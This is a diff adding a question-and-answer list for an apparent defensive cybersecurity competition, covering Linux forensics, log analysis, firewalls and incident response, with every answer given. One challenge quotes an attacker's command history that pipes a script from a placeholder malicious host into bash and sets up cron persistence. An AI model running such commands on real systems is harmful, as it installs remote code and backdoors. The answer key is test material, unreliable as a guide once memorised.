@@ -1,0 +1,221 @@
+
+================================================================================
+ANSEN CYBERSECURITY COMPETITION - ALL CHALLENGES
+================================================================================
+
+--------------------------------------------------------------------------------
+ID: 1
+Type: multiple_choice
+Title: Basic Defense Knowledge
+Category: Basic Knowledge
+Difficulty: easy
+Points: 100
+
+Description:
+Which command can view all running processes in a Linux system?
+
+Options:
+  A. ls
+  B. ps
+  C. top
+  D. netstat
+
+Answer: B
+
+--------------------------------------------------------------------------------
+ID: 2
+Type: multiple_choice
+Title: Log Analysis
+Category: Log Analysis
+Difficulty: easy
+Points: 100
+
+Description:
+When analyzing intrusion incidents, which log file typically stores user login records in Linux?
+
+Options:
+  A. /var/log/messages
+  B. /var/log/syslog
+  C. /var/log/auth.log
+  D. /var/log/kern.log
+
+Answer: C
+
+--------------------------------------------------------------------------------
+ID: 3
+Type: multiple_choice
+Title: Network Security
+Category: Network Defense
+Difficulty: medium
+Points: 150
+
+Description:
+In iptables, which chain is used to process packets destined for the local machine?
+
+Options:
+  A. INPUT
+  B. OUTPUT
+  C. FORWARD
+  D. PREROUTING
+
+Answer: A
+
+--------------------------------------------------------------------------------
+ID: 4
+Type: multiple_choice
+Title: Incident Response
+Category: Incident Response
+Difficulty: medium
+Points: 150
+
+Description:
+When a backdoor is discovered on the system, which operation should be performed first?
+
+Options:
+  A. Delete backdoor files immediately
+  B. Disconnect network connection
+  C. Restart the system
+  D. Change all passwords
+
+Answer: B
+
+--------------------------------------------------------------------------------
+ID: 5
+Type: multiple_choice
+Title: Threat Detection
+Category: Threat Identification
+Difficulty: hard
+Points: 200
+
+Description:
+Which behavior most likely indicates the presence of a crypto mining trojan?
+
+Options:
+  A. Disk space rapidly decreasing
+  B. Network traffic suddenly increasing
+  C. Frequent DNS queries
+  D. CPU usage consistently above 90%
+
+Answer: D
+
+--------------------------------------------------------------------------------
+ID: 6
+Type: practical
+Title: Linux Process Forensics
+Category: Linux Forensics
+Difficulty: medium
+Points: 300
+
+Description:
+Your server is exhibiting abnormal behavior with unusually high CPU usage. Analysis reveals a suspicious process.
+
+**Scenario**:
+- Process name: /tmp/.systemd-monitor
+- PID: 1337
+- Parent process: init
+- User: root
+- CPU usage: 95%
+
+**Task**: What type of malicious program is this process most likely? (Answer in one word: CryptoMiner/RemoteControl/Ransomware/DDoSTrojan)
+
+Answer: CryptoMiner
+
+--------------------------------------------------------------------------------
+ID: 7
+Type: practical
+Title: Log Analysis Practice
+Category: Log Analysis
+Difficulty: easy
+Points: 250
+
+Description:
+Analyze the following auth.log excerpt and identify the attack type:
+
+```
+Jan 15 10:23:11 server sshd[12345]: Failed password for root from 192.168.1.100 port 52134 ssh2
+Jan 15 10:23:15 server sshd[12346]: Failed password for root from 192.168.1.100 port 52135 ssh2
+Jan 15 10:23:18 server sshd[12347]: Failed password for admin from 192.168.1.100 port 52136 ssh2
+Jan 15 10:23:21 server sshd[12348]: Failed password for admin from 192.168.1.100 port 52137 ssh2
+Jan 15 10:23:24 server sshd[12349]: Accepted password for admin from 192.168.1.100 port 52138 ssh2
+```
+
+**Task**: What type of attack is this? (Answer: BruteForce/SQLInjection/XSS/CSRF)
+
+Answer: BruteForce
+
+--------------------------------------------------------------------------------
+ID: 8
+Type: practical
+Title: Command Identification
+Category: Command Analysis
+Difficulty: medium
+Points: 300
+
+Description:
+You found the following command history on the server:
+
+```bash
+curl http://malicious.com/shell.sh | bash
+chmod +x /tmp/.hidden
+nohup /tmp/.hidden &
+echo "*/5 * * * * /tmp/.hidden" | crontab -
+```
+
+**Task**: What is the purpose of the attacker's last command? (Answer: Persistence/InformationGathering/LateralMovement/CoveringTracks)
+
+Answer: Persistence
+
+--------------------------------------------------------------------------------
+ID: 9
+Type: practical
+Title: Port Analysis
+Category: Network Analysis
+Difficulty: hard
+Points: 350
+
+Description:
+Found the following suspicious connection using netstat:
+
+```
+tcp    0    0 10.0.1.15:33456    185.220.101.5:4444    ESTABLISHED    1337/systemd
+```
+
+**Task**: Based on port characteristics, what type of connection is this most likely? (Answer: ReverseShell/ForwardProxy/DatabaseConnection/WebService)
+
+Answer: ReverseShell
+
+--------------------------------------------------------------------------------
+ID: 10
+Type: practical
+Title: File Forensics
+Category: Linux Forensics
+Difficulty: hard
+Points: 400
+
+Description:
+A suspicious file was discovered during system inspection:
+
+```bash
+-rwsr-xr-x 1 root root 8192 Jan 15 03:22 /usr/bin/find
+```
+
+**Task**: What security risk does this file's permission setting pose? (Answer: SUIDEscalation/DirectoryTraversal/BufferOverflow/PermissionLeak)
+
+Answer: SUIDEscalation
+
+--------------------------------------------------------------------------------
+ID: 41
+Type: incident_response
+Title: Server Compromise - SSH Brute Force Attack
+Category: Incident Response
+Difficulty: hard
+Points: 1000
+
+Description:
+A production web server (10.0.1.15) has been compromised. The monitoring system detected unusual CPU usage and suspicious network connections. Your task is to investigate the incident following the standard SOP and complete all phases of the incident response process.
+
+Answer: Complete all 5 phases
+
+================================================================================
+Total Challenges: 11
+================================================================================
